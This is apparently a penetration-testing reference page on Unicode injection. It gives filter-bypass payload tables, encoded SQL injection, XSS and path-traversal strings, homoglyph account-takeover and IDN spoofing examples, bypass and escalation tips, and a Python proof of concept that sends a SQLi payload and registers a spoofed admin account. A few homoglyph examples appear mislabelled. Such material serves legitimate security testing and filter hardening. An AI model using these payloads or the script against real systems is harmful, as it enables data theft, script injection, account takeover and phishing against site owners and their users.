# Unicode Injection

> **Summary**: Unicode injection exploits the way applications handle Unicode normalization, encoding, and character equivalence to bypass security filters, achieve injection attacks, or impersonate users via homoglyph/visually similar characters.
> **Impact**: Filter bypass leading to XSS, SQLi, or path traversal; account takeover via homoglyph registration; URL spoofing via IDN homograph attacks; authentication bypass via case mapping collisions.
> **Typical Severity**: Medium to High

## Detection

### Indicators
- Application performs Unicode normalization (NFC, NFD, NFKC, NFKD) after security filtering
- Input is filtered/sanitized before normalization, allowing post-normalization injection
- Application uses Unicode-aware string comparison without consistent normalization
- Registration/login systems accept Unicode characters in usernames or emails
- URL handling involves Unicode or internationalized domain names (IDN)

### Automated Detection
- Send the Kelvin sign `U+212A` (`%e2%84%aa`) where letter "K" is expected; if "K" is echoed back, normalization is occurring
- Fuzz with Unicode equivalents of blocked characters (`'`, `"`, `<`, `>`, `/`)
- Test registration with homoglyph variations of existing usernames

### Manual Detection
1. Inject a Unicode character that normalizes to an ASCII equivalent:
   ```
   Input: %e2%84%aa (Kelvin sign, normalizes to K)
   ```
2. If the response shows "K", Unicode normalization is being performed
3. Test if normalization happens after input validation/filtering

## Unicode Normalization Forms

| Form | Name | Description |
|------|------|-------------|
| NFC | Canonical Decomposition + Canonical Composition | Decomposes then recomposes characters |
| NFD | Canonical Decomposition | Decomposes characters to base + combining marks |
| NFKC | Compatibility Decomposition + Canonical Composition | Normalizes compatibility equivalents |
| NFKD | Compatibility Decomposition | Broadest normalization; maps to simplest form |

**NFKC and NFKD** are the most relevant for attacks because they map visually similar characters to their ASCII equivalents.

## Exploitation

### Prerequisites
- Application processes Unicode input
- Security filtering occurs before Unicode normalization (filter-then-normalize vulnerability)
- Or: application accepts Unicode characters that are visually identical to ASCII but semantically different

### Step-by-Step

1. **Detect normalization**: Send a known Unicode equivalent and check if it is normalized.
   ```
   Send: %e2%84%aa (Kelvin sign)
   Expected if normalized: K
   ```
   **Success**: Character is normalized, confirming the attack surface.

2. **Identify filter-then-normalize pattern**: Test if blocked characters can be represented as Unicode equivalents that survive the filter but normalize to the blocked character after filtering.
   ```
   Filter blocks: ' (0x27 single quote)
   Send: %ef%bc%87 (fullwidth apostrophe, normalizes to ')
   ```
   **Success**: The Unicode character passes the filter and normalizes to the blocked character.

3. **Exploit the bypass**: Use the normalized character to achieve injection (SQLi, XSS, etc.).

4. **For homoglyph attacks**: Register accounts or craft URLs using visually identical Unicode characters.

### Payloads

#### Unicode Equivalents for Injection Characters

| ASCII | Unicode Equivalent | Hex Encoding |
|-------|--------------------|--------------|
| `'` | Fullwidth apostrophe | `%ef%bc%87` |
| `"` | Fullwidth quotation mark | `%ef%bc%82` |
| `<` | Fullwidth less-than | `%ef%bc%9c` |
| `>` | Fullwidth greater-than | `%ef%bc%9e` |
| `/` | Fullwidth solidus | `%ef%bc%8f` |
| `\` | Fullwidth reverse solidus | `%ef%bc%bc` |
| `-` | Small hyphen-minus | `%ef%b9%a3` |
| `#` | Small number sign | `%ef%b9%9f` |
| `*` | Small asterisk | `%ef%b9%a1` |
| `\|` | Fullwidth vertical line | `%ef%bd%9c` |
| `=` | Superscript equals | `%e2%81%bc` |
| `o` | Latin small letter o (modifier) | `%e1%b4%bc` |
| `r` | Latin small letter r (modifier) | `%e1%b4%bf` |
| `1` | Superscript one | `%c2%b9` |

#### SQL Injection via Unicode Normalization

```
# Original payload: ' or 1=1-- -
# Unicode equivalent:
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

# Original: " or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

# Original: ' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```

**SQLMap with Unicode tamper:**
- [sqlmap_to_unicode_template](https://github.com/carlospolop/sqlmap_to_unicode_template)

#### XSS via Unicode Normalization

```html
# If < and > are filtered, use Unicode equivalents:
%e2%89%ae script%e2%89%af alert(1) %e2%89%ae /script%e2%89%af

# Using fullwidth characters:
%ef%bc%9cscript%ef%bc%9ealert(1)%ef%bc%9c/script%ef%bc%9e

# Other Unicode characters that may normalize to < :
# U+226E (not less-than) -- may normalize depending on implementation
# U+FE64 (small less-than sign)
```

#### Homoglyph Account Takeover

```
# Target username: admin
# Homoglyph variations:
admIn   (using Latin small letter dotless i: U+0131)
admin   (using Cyrillic а: U+0430 instead of Latin a)
аdmin   (Cyrillic а looks identical to Latin a)
adm1n   (digit 1 resembles lowercase L in some fonts)
```

**Registration flow:**
1. Identify a high-value username (admin, support, moderator)
2. Register using a homoglyph variant that looks identical
3. If the application normalizes at login but not at registration, you may gain access to the original account
4. Or: use the visually identical account for social engineering

#### IDN Homograph Attack (URL Spoofing)

```
# Legitimate: apple.com
# Spoofed: аpple.com (Cyrillic а instead of Latin a)
# Punycode: xn--pple-43d.com

# Legitimate: paypal.com
# Spoofed: pаypal.com (Cyrillic а)
# Punycode: xn--pypal-4ve.com
```

#### Case Mapping Collisions

Some Unicode characters have unexpected case mappings:
```python
# German sharp s (ß) uppercases to SS
"ß".upper() == "SS"

# Turkish dotted/dotless i
"I".lower()  # -> "i" in most locales, "ı" in Turkish
"i".upper()  # -> "I" in most locales, "İ" in Turkish

# Kelvin sign
"K" == "\u212A".normalize("NFKC")  # True
```

**Exploitation**: If an application lowercases email for lookup but not for registration:
```
Register: Admin@target.com  (blocked: "admin" is reserved)
Register: admın@target.com  (Turkish dotless i, passes check)
Login:    admin@target.com   (normalization maps ı -> i, matches admin account)
```

#### Path Traversal via Unicode

```
# If ../ is filtered:
..%ef%bc%8f    (fullwidth solidus normalizes to /)
..%c0%af       (overlong UTF-8 encoding of /)
..%e0%80%af    (overlong UTF-8 encoding of /)
```

#### Regex Bypass via Unicode

When regex validation normalizes differently from the function that uses the input:
```
# SSRF filter: regex checks URL against allowlist
# But request library normalizes Unicode before making request
# Send: http://ⅹⅹⅹ.target.internal/ (using Roman numeral characters)
# Regex sees Unicode, request normalizes to ASCII
```

### Proof of Concept

```python
import unicodedata
import requests

target = "http://<TARGET>"

# Test normalization detection
kelvin_sign = "\u212A"  # Kelvin sign
normalized = unicodedata.normalize("NFKC", kelvin_sign)
print(f"Kelvin sign normalizes to: {normalized}")  # K

# Test SQLi with Unicode bypass
fullwidth_quote = "%ef%bc%87"  # Fullwidth apostrophe
payload = f"{fullwidth_quote}+OR+1=1--+-"
r = requests.get(f"{target}/search?q={payload}")
print(r.text)

# Test homoglyph registration
cyrillic_a = "\u0430"  # Cyrillic а (looks like Latin a)
spoofed_username = f"{cyrillic_a}dmin"
r = requests.post(f"{target}/register", data={
    "username": spoofed_username,
    "password": "test123"
})
print(f"Registration status: {r.status_code}")
```

## Bypasses

- If the application filters after normalization, try double encoding or overlong UTF-8 sequences
- If homoglyph detection is in place, combine characters from multiple scripts (mixed-script confusables)
- If the application blocks specific Unicode ranges, try characters from less common Unicode blocks
- Use width variants (halfwidth/fullwidth forms, U+FF00-U+FFEF) as they often normalize to ASCII
- Combine normalization attacks with other injection techniques for layered bypasses

## Escalation

- **Filter bypass to SQL injection**: Extract database contents via normalized Unicode quotes
- **Filter bypass to XSS**: Execute JavaScript via normalized angle brackets
- **Homoglyph registration to account takeover**: Impersonate admin or support accounts
- **IDN homograph to phishing**: Create convincing spoofed domains
- **Case mapping collision to auth bypass**: Access accounts via locale-dependent normalization

## Tools

| Tool | Usage |
|------|-------|
| Unicode Table | [unicode-table.com](https://unicode-table.com/) -- Look up character properties and equivalents |
| Confusables Tool | [unicode.org/cldr/utility/confusables.jsp](https://unicode.org/cldr/utility/confusables.jsp) -- Find visually similar characters |
| SQLMap Unicode Tamper | [sqlmap_to_unicode_template](https://github.com/carlospolop/sqlmap_to_unicode_template) |
| Normalization Table | [0xacb.com/normalization_table](https://0xacb.com/normalization_table) -- Unicode normalization mappings |
| Burp Suite | Test Unicode payloads in Repeater/Intruder |

## References

- [Unicode Normalization Vulnerabilities - AppCheck](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)
- [Unicode Equivalence Tables](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html)
- [HackTricks - Unicode Normalization](https://book.hacktricks.xyz/pentesting-web/unicode-injection/unicode-normalization)
- [IDN Homograph Attack - Wikipedia](https://en.wikipedia.org/wiki/IDN_homograph_attack)

## Cross-References

- [Registration Vulnerabilities](../authentication/registration-vulns.md) -- Homoglyph registration attacks
- [Open Redirect](open-redirect.md) -- Unicode in URLs for redirect bypass
- [XSS](xss.md) -- Unicode normalization bypass for XSS filters
- [SQL Injection](sqli.md) -- Unicode equivalents of SQL injection characters
